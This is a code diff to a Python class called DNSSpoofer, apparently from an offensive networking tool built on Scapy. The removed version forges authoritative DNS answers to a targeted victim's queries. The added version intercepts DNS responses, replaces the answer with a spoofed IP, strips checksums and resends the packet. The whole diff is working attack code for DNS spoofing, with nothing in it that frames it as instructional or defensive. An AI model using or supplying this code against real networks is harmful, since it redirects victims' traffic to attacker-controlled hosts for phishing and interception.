@@ -30,76 +30,35 @@ class DNSSpoofer:
         if packet.haslayer(IPv6):
             return packet[IPv6].src, IPv6
         return None, None
-
+    
     def _dns_filter(self, packet):
-        try:
-            # Basic DNS query validation
-            if not (
-                packet.haslayer(DNS) and
-                packet[DNS].qr == 0 and
-                packet.haslayer(UDP) and
-                packet[UDP].dport == 53 and
-                packet.haslayer(DNSQR)
-            ):
-                # self.logger("No DNS query")
-                return False
-
-            src_ip, ip_layer = self._get_src_ip(packet)
-            if src_ip != self.victim_ip:
-                self.logger("not correct IP")
-                return False
-
-            qname = packet[DNSQR].qname
-            domain = (
-                qname.decode("utf-8", errors="ignore").rstrip(".")
-                if isinstance(qname, bytes)
-                else str(qname).rstrip(".")
-            )
-
-            qtype = packet[DNSQR].qtype
-            spoof_ip = self.dns_mapping.get(domain)
-
-            if not spoof_ip:
-                self.logger(f"not spoof IP for {domain}")
-                return False
-
-            # Determine record type
-            if qtype == 1:  # A record
-                rdata = spoof_ip
-                rr_type = "A"
-            elif qtype == 28 and self.attacker_ipv6:  # AAAA record
-                rdata = self.attacker_ipv6
-                rr_type = "AAAA"
-            else:
-                self.logger("not record type")
-                return False
-
-            # Build response
-            ip_response = ip_layer(
-                dst=packet[ip_layer].src,
-                src=packet[ip_layer].dst
-            )
-
-            dns_reply = (
-                ip_response /
-                UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
-                DNS(
-                    id=packet[DNS].id,
-                    qr=1,
-                    aa=1,
-                    qd=packet[DNS].qd,
-                    an=DNSRR(
-                        rrname=packet[DNSQR].qname,
-                        type=rr_type,
-                        ttl=300,
-                        rdata=rdata
-                    )
+        if packet.haslayer(DNSRR):
+            try:
+                # Get the domain name of the DNS request
+                qname = packet[DNSQR].qname
+                domain = (
+                    qname.decode("utf-8", errors="ignore").rstrip(".")
+                    if isinstance(qname, bytes)
+                    else str(qname).rstrip(".")
                 )
-            )
-
-            send(dns_reply, iface=self.interface, verbose=0)
-            return True
-
-        except Exception as e:
-            self.logger(f"DNS filter error: {e}")
-            return False
+                spoof_ip = self.dns_mapping.get(domain)
+                if not spoof_ip:
+                    # Skip if we don't want to spoof this IP
+                    return False
+                # Set the spoofed IP.
+                packet[DNS].an = DNSRR(rrname=qname, rdata=spoof_ip)
+                # Set nr. of answers to 1.
+                packet[DNS].ancount = 1
+                # Remove checksums
+                del packet[IP].len
+                del packet[IP].chksum
+                del packet[UDP].len
+                del packet[UDP].chksum
+                # Send modified packet and return that we spoofed it.
+                send(packet, iface=self.interface, verbose=0)
+                self.logger(f"Spoofed {domain}")
+                return True
+            except Exception as e:
+                self.logger(f"DNS filter error: {e}")
+                return False
+        return False
